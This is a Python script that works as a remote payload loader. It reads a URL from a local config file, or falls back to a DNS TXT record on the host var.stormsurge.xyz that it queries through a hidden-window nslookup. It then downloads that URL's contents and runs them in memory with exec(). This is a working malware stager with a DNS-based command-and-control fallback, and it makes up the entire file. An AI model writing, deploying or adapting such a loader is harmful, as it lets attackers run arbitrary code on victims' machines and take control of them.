import requests
import sys
import os
import time
import subprocess
import platform

def get_txt_record_value(hostname):
    """
    Retrieves the first TXT record value for a given hostname using nslookup.
    """
    txt_value = None
    startupinfo = subprocess.STARTUPINFO()
    startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
    startupinfo.wShowWindow = subprocess.SW_HIDE

    try:
        command = ["nslookup", "-q=TXT", hostname]
        process = subprocess.Popen(
            command,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            startupinfo=startupinfo,
            encoding='utf-8',
            errors='ignore'
        )
        stdout, stderr = process.communicate(timeout=15)

        if process.returncode == 0 and stdout:
            lines = stdout.splitlines()
            txt_value_parts = []
            collecting_current_txt = False

            for line in lines:
                temp_line = line.lstrip()
                if not collecting_current_txt:
                    if "text =" in temp_line and (temp_line.startswith(hostname) or temp_line.startswith(hostname + ".")):
                        collecting_current_txt = True
                        try:
                            val_on_line = line.split("text =", 1)[1].strip()
                            if val_on_line.startswith('"') and val_on_line.endswith('"'):
                                txt_value_parts.append(val_on_line[1:-1])
                            elif val_on_line:
                                txt_value_parts.append(val_on_line)
                        except IndexError:
                            pass
                elif collecting_current_txt:
                    stripped_line = line.strip()
                    if stripped_line.startswith('"') and stripped_line.endswith('"'):
                        txt_value_parts.append(stripped_line[1:-1])
                    elif not stripped_line:
                        pass
                    else:
                        if txt_value_parts: break
                        else: collecting_current_txt = False

            if txt_value_parts:
                txt_value = "".join(txt_value_parts)
    except Exception as e:
        print(f"DNS query error: {e}")

    return txt_value

def get_config_url():
    """
    Locates config.txt in the script directory. Creates it if missing.
    Returns the URL found in the file.
    """
    base_dir = os.path.dirname(os.path.abspath(__file__))
    config_path = os.path.join(base_dir, "config.txt")

    if not os.path.exists(config_path):
        print(f"Config file not found. Creating template at: {config_path}")
        with open(config_path, "w") as f:
            f.write("https://your-server.com/payload.txt")
        return None

    with open(config_path, "r") as f:
        url = f.read().strip()
        return url if url else None

def run_remote_client():
    # 1. Try to get URL from local config.txt
    target_url = get_config_url()

    # 2. Fallback to DNS TXT record if config.txt is empty or missing
    if not target_url:
        print("No URL found in config.txt. Attempting DNS fallback...")
        dns_host = "var.stormsurge.xyz"
        target_url = get_txt_record_value(dns_host)

    if not target_url:
        print("Error: No target URL could be determined.")
        return

    # 3. Fetch and Execute in memory
    try:
        print(f"Fetching payload from: {target_url}")
        response = requests.get(target_url, timeout=10)
        response.raise_for_status()

        print("Execution started...")
        # Execute the fetched string in the global scope
        exec(response.text, globals())
        print("Execution finished.")

    except Exception as e:
        print(f"Failed to execute remote code: {e}")

if __name__ == '__main__':
    run_remote_client()
